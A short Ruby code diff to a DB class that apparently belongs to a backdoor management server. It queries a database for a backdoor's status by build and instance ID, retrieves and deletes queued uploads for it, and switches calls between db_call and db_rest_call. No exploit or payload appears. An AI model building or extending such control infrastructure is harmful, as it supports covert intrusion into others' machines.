@@ -216,7 +216,8 @@ class DB
     trace :debug, "Asking the status of [#{build_id}] to the db"
 
     # ask the database the status of the backdoor
-    status, bid = db_rest_call :backdoor_status, build_id, instance_id, subtype
+    #status, bid = db_rest_call :backdoor_status, build_id, instance_id, subtype
+    status, bid = db_call :backdoor_status, build_id, instance_id, subtype
 
     # if status is nil, the db down. btw we must not fail, fake the reply
     return (status.nil?) ? [DB::UNKNOWN_BACKDOOR, 0] : [status, bid]
@@ -289,7 +290,7 @@ class DB
     return false unless @available
 
     # retrieve the upload from the db
-    uploads = db_call :new_uploads, bid
+    uploads = db_rest_call :new_uploads, bid
 
     # put the upload in the cache
     DBCache.save_uploads bid, uploads unless (uploads.nil? or uploads.empty?) 
@@ -304,10 +305,10 @@ class DB
     return nil if upload.nil?
 
     # delete from the db
-    db_call :del_upload, upload[:id] if @available
+    db_rest_call :del_upload, bid, upload[:id] if @available
 
     # delete the upload from the cache
-    DBCache.del_upload upload[:id]
+    DBCache.del_upload bid, upload[:id]
 
     return upload[:upload], left
   end
